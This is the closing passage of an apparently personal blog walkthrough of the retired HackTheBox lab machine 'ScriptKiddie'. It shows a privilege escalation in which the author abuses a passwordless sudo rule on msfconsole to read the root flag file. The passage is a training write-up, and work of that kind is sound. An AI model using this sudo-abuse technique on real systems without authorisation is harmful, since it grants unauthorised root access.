../content/images/size/w1000/2021/06/image-258.png 1000w, ../content/images/size/w1600/2021/06/image-258.png 1600w, ../content/images/2021/06/image-258.png 1940w" sizes="(min-width: 720px) 720px"></figure><p>If you don't have enough knowledge on <code>sudo</code> commands, check <a href="https://www.explainshell.com/explain?cmd=sudo+-l&ref=172.16.211.133" rel="noopener noreferrer">explainshell.com</a> It will explain every shell command in a pretty nice way. Here is for <code>sudo -l</code></p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-259.png" class="kg-image" alt loading="lazy" width="1387" height="484" srcset="../content/images/size/w600/2021/06/image-259.png 600w, ../content/images/size/w1000/2021/06/image-259.png 1000w, ../content/images/2021/06/image-259.png 1387w" sizes="(min-width: 720px) 720px"></figure><p>Nevertheless, we can simply say that we can use <code>/opt/metasploit-framework-6.0.9/msfconsole</code> with super user (sudo) permission without asking a password. üòâüòâ Let's try, type the following command and hit enter.</p><pre><code class="language-bash">sudo /opt/metasploit-framework-6.0.9/msfconsole
sudo cat /root/root.txt</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-260.png" class="kg-image" alt loading="lazy" width="2000" height="1531" srcset="../content/images/size/w600/2021/06/image-260.png 600w, ../content/images/size/w1000/2021/06/image-260.png 1000w, ../content/images/size/w1600/2021/06/image-260.png 1600w, ../content/images/2021/06/image-260.png 2166w" sizes="(min-width: 720px) 720px"></figure><p>Wollah !!! We got the root flag. üòéüòéüëëüëë</p><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/f5d65a923b43647a6bd917578031627e.gif" class="kg-image" alt loading="lazy" width="499" height="207"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2021/06/image-262.png" class="kg-image" alt loading="lazy" width="832" height="749" srcset="../content/images/size/w600/2021/06/image-262.png 600w, ../content/images/2021/06/image-262.png 832w" sizes="(min-width: 720px) 720px"></figure><p>Okay... I‚Äôll see you on the next retired machine!  Stay connected... üôã‚Äç‚ôÇÔ∏èüôã‚Äç‚ôÇÔ∏è</p><p><strong>Find me on <a href="https://twitter.com/h4rithd?ref=172.16.211.133" rel="noreferrer">@twitter</a></strong> </p>
                <section class="m-tags in-post">
                  <h3 class="m-submenu-title">Tags</h3>
                  <ul>
                      <li>
                        <a href="../tag/scriptkiddie-walkthrough/index.html" title="ScriptKiddie Walkthrough">ScriptKiddie Walkthrough</a>
                      </li>
                      <li>
                        <a href="../tag/cve-2020-7384/index.html" title="CVE-2020-7384">CVE-2020-7384</a>
                      </li>
                      <li>
                        <a href="../tag/h4rithd/index.html" title="h4rithd">h4rithd</a>
                      </li>
                      <li>
                        <a href="../tag/harith-dilshan/index.html" title="Harith Dilshan">Harith Dilshan</a>
                      </li>
                      <li>
                        <a href="../tag/retired-machines-htb/index.html" title="Retired Machines HTB">Retired Machines HTB</a>
                      </li>
                  </ul>
                </section>
            </div>
          </div>
        </div>
        
        <section class="m-author">
          <div class="m-author__content">
            <div class="m-author__picture">
              <a href="../author/h4rithd/index.html" class="m-author-picture" aria-label="Harith Dilshan">
                  <div style="background-image: url(../content/images/2023/11/5-1.jpeg);"></div>
              </a>
            </div>
            <div class="m-author__info">
              <h4 class="m-author__name">
                <a href="../author/h4rithd/index.html">Harith Dilshan</a>
              </h4>
                <p class="m-author__bio">- Offensive Security Engineer | Ethical Hacker | Penetration Tester -</p>
              <ul class="m-author-links">
                  <li>
                    <a href="https://h4rithd.com/" target="_blank" rel="noopener" aria-label="Website">
                      <span class="icon-globe" aria-hidden="true"></span>
                    </a>
                  </li>
                  <li>
                    <a href="https://twitter.com/@h4rithd" target="_blank" rel="noopener" aria-label="Twitter">
                      <span class="icon-twitter" aria-hidden="true"></span>
                    </a>
                  </li>
              </ul>
            </div>
          </div>
        </section>
          <section class="m-recommended">
            <div class="l-wrapper in-recommended">
              <h3 class="m-section-title in-recommended">Recommended for you</h3>
              <div class="m-recommended-articles">
                <div class="m-recommended-slider glide js-recommended-slider">
                  <div class="glide__track" data-glide-el="track">
                    <div class="glide__slides">
                      
    <div class="m-recommended-slider__item glide__slide">
  <article class="m-article-card  post tag-broker-walkthrough tag-walkthrough tag-hackthebox tag-retired-machines-htb tag-h4rithd-com tag-htb tag-10-10-11-243 tag-apache-activemq tag-cve-2023-46604 featured">
    <div class="m-article-card__picture">
      <a href="../broker-walkthrough/index.html" class="m-article-card__picture-link" aria-hidden="true" tabindex="-1"></a>
        <img class="m-article-card__picture-background" src="../content/images/size/w600/2023/11/PostImage.jpg" loading="lazy" alt="">
      <a href="../author/h4rithd/index.html" class="m-article-card__author js-tooltip" aria-label="Harith Dilshan" data-tippy-content="Posted by Harith Dilshan ">
          <div style="background-image: url(../content/images/size/w100/2023/11/5-1.jpeg);"></div>
      </a>
        <a href="../broker-walkthrough/index.html" class="m-article-card__featured js-tooltip" data-tippy-content="Featured" aria-label="Featured">
          <span class="icon-star" aria-hidden="true"></span>
        </a>
    </div>
      <div class="m-article-card__info">
        <a href="../tag/broker-walkthrough/index.html" class="m-article-card__tag">Broker Walkthrough</a>
      <a href="../broker-walkthrough/index.html" class="m-article-card__info-link" aria-label="Broker Walkthrough">
        <div>
          <h2 class="m-article-card__title js-article-card-title " title="Broker Walkthrough">
            Broker Walkthrough
          </h2>
        </div>
        <div class="m-article-card__timestamp">
          <span>2 days ago</span>
          <span>&bull;</span>
          <span>7 min read</span>
        </div>
      </a>
    </div>
  </article>
    </div>
    <div class="m-recommended-slider__item glide__slide">
  <article class="m-article-card  post tag-h4rithd tag-harith-dilshan tag-retired-machines-htb tag-knife-walkthrough">
    <div class="m-article-card__picture">
      <a href="../knife-walkthrough/index.html" class="m-article-card__picture-link" aria-hidden="true" tabindex="-1"></a>
        <img class="m-article-card__picture-background" src="../content/images/size/w600/2021/08/PostBanner.jpg" loading="lazy" alt="">
      <a href="../author/h4rithd/index.html" class="m-article-card__author js-tooltip" aria-label="Harith Dilshan" data-tippy-content="Posted by Harith Dilshan ">
          <div style="background-image: url(../content/images/size/w100/2023/11/5-1.jpeg);"></div>
      </a>
    </div>
      <div class="m-article-card__info">
        <a href="../tag/h4rithd/index.html" class="m-article-card__tag">h4rithd</a>
      <a href="../knife-walkthrough/index.html" class="m-article-card__info-link" aria-label="Knife Walkthrough">
        <div>
          <h2 class="m-article-card__title js-article-card-title " title="Knife Walkthrough">
            Knife Walkthrough
          </h2>
        </div>
        <div class="m-article-card__timestamp">
          <span>2 years ago</span>
          <span>&bull;</span>
          <span>5 min read</span>
        </div>
      </a>
    </div>
  </article>
    </div>
    <div class="m-recommended-slider__item glide__slide">
  <article class="m-article-card  post tag-starting-point-htb tag-base-walkthrough tag-h4rithd tag-harith-dilshan">
    <div class="m-article-card__picture">
      <a href="../starting-point-htb-base-walkthrough/index.html" class="m-article-card__picture-link" aria-hidden="true" tabindex="-1"></a>
        <img class="m-article-card__picture-background" src="../content/images/size/w600/2021/06/BaseBG.jpg" loading="lazy" alt="">
      <a href="../author/h4rithd/index.html" class="m-article-card__author js-tooltip" aria-label="Harith Dilshan" data-tippy-content="Posted by Harith Dilshan ">
          <div style="background-image: url(../content/images/size/w100/2023/11/5-1.jpeg);"></div>
      </a>
    </div>
      <div class="m-article-card__info">
        <a href="../tag/starting-point-htb/index.html" class="m-article-card__tag">Starting Point Walkthrough</a>
      <a href="../starting-point-htb-base-walkthrough/index.html" class="m-article-card__info-link" aria-label="Base Walkthrough">
        <div>
          <h2 class="m-article-card__title js-article-card-title " title="Base Walkthrough">
            Base Walkthrough
          </h2>
        </div>
        <div class="m-article-card__timestamp">
          <span>2 years ago</span>
          <span>&bull;</span>
          <span>7 min read</span>
        </div>
      </a>
    </div>
  </article>
    </div>
                    </div>
                  </div>
                  <div data-glide-el="controls" class="glide__arrows js-controls">
                    <button data-glide-dir="<" class="m-icon-button filled in-recommended-articles glide-prev" aria-label="Previous">
                      <span class="icon-arrow-left" aria-hidden="true"></span>
                    </button>
                    <button data-glide-dir=">" class="m-icon-button filled in-recommended-articles glide-next" aria-label="Next">
                      <span class="icon-arrow-right" aria-hidden="true"></span>
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </section>
    </div>
  </article>
</main>



    
<div class="m-search js-search" role="dialog" aria-modal="true" aria-label="Search">
  <button class="m-icon-button outlined as-close-search js-close-search" aria-label="Close search">
    <span class="icon-close" aria-hidden="true"></span>
  </button>
  <div class="m-search__content">
    <form class="m-search__form">
      <div class="pos-relative">
        <span class="icon-search m-search-icon" aria-hidden="true"></span>
        <label for="search-input" class="sr-only">
          Type to search
        </label>
        <input id="search-input" type="text" class="m-input in-search js-input-search" placeholder="Type to search">
      </div>
    </form>
    <div class="js-search-results hide"></div>
    <p class="m-not-found align-center hide js-no-results">
      No results for your search, please try with something else.
    </p>
  </div>
</div>

    
<footer class="m-footer">
  <div class="m-footer__content">
    <nav class="m-footer-social">
        <a href="https://twitter.com/h4rithd" target="_blank" rel="noopener" aria-label="Twitter">
          <span class="icon-twitter" aria-hidden="true"></span>
        </a>
      <a href="https://h4rithd.com/blog/rss" aria-label="RSS">
        <span class="icon-rss" aria-hidden="true"></span>
      </a>
    </nav>
    <p class="m-footer-copyright">
      <span>h4rithd.com &copy; 2023</span>  
    </p>
    <p class="m-footer-copyright jslicense">
     <span>Published with üñ§  </span>
    </p>
  </div>
</footer>

    
    <script crossorigin="anonymous" src="https://polyfill.io/v3/polyfill.min.js?features=IntersectionObserver%2CPromise%2CArray.prototype.includes%2CString.prototype.endsWith%2CString.prototype.startsWith%2CObject.assign%2CNodeList.prototype.forEach"></script>
    <script defer src="../assets/js/manifest.js%3Fv=41e967d101"></script>
    <script defer src="../assets/js/vendor/content-api.min.js%3Fv=41e967d101"></script>
    <script defer src="../assets/js/vendor.js%3Fv=41e967d101"></script>
    <script defer src="../assets/js/app.js%3Fv=41e967d101"></script>

      <script defer src="../assets/js/post.js%3Fv=41e967d101"></script>


    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.15.0/prism.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.15.0/components/prism-python.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-bash.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-sql.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-powershell.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-ruby.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-csharp.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.23.0/components/prism-cpp.min.js"></script>

<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/plugins/toolbar/prism-toolbar.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', (event) => {
        document.querySelectorAll('pre[class*=language-]').forEach(function (node) {
            node.classList.add('line-numbers');
        });
        Prism.highlightAll();
    });
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/plugins/line-numbers/prism-line-numbers.min.js"></script>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-121547351-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-121547351-1');
</script>
  </body>
</html>
